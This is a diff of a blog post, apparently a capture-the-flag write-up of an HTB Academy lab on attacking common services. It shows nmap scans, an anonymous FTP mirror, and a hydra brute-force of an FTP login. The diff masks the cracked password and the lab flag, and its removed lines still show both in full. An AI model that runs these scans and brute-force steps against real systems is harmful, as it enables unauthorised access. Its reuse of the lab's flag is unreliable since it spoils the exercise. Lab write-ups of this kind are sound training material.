@@ -3,11 +3,11 @@ title: "HTB Academy | Attacking Common Services lab 2"
 description: "This is a medium lab writeup from the htb module attacking common services"
 pubDate: "Nov 17 2024"
 heroImage: "https://academy.hackthebox.com/storage/modules/116/logo.png?t=1730242916"
-badge: "Medium"
+badge: "Linux - Medium"
 tags: ["ftp", "bruteforcing", "information-leakage","Linux"]
 ---
 
-- 1. Nmap scan:
+- 1. Nmap TCP Open Ports:
 
 ```sh
 sudo nmap -sS -p- --open --min-rate -Pn -n -vvv $target -oG allports
@@ -29,7 +29,7 @@ sudo nmap -sS -p- --open --min-rate -Pn -n -vvv $target -oG allports
  
 ```
 
-- 1.2 Scripts and services:
+- 1.2 Nmap Basic Scripts and services scan:
 
 ```sh
 nmap -sCV -p 22,53,110,995,2121,30021 $target -oN targeted
@@ -142,7 +142,7 @@ wget -m --no-passive ftp://anonymous:anonymous@$target:30021
 ❯ hydra -l simon -P 10.129.170.253:30021/simon/mynotes.txt ftp://10.129.170.253:2121
 
 [DATA] attacking ftp://10.129.170.253:2121/
-[2121][ftp] host: 10.129.170.253   login: simon   password: 8Ns8j1b!23hs4921smHzwn
+[2121][ftp] host: 10.129.170.253   login: simon   password: 8Ns************
 1 of 1 target successfully completed, 1 valid password found
 ```
 
@@ -154,7 +154,7 @@ wget -m --no-passive ftp://anonymous:anonymous@$target:30021
 simon@lin-medium:~$ ls
 flag.txt  Maildir
 simon@lin-medium:~$ cat flag.txt 
-HTB{1qay2wsx3EDC4rfv_M3D1UM}
+HTB{1q****************}
 simon@lin-medium:~$ 
 
 ```
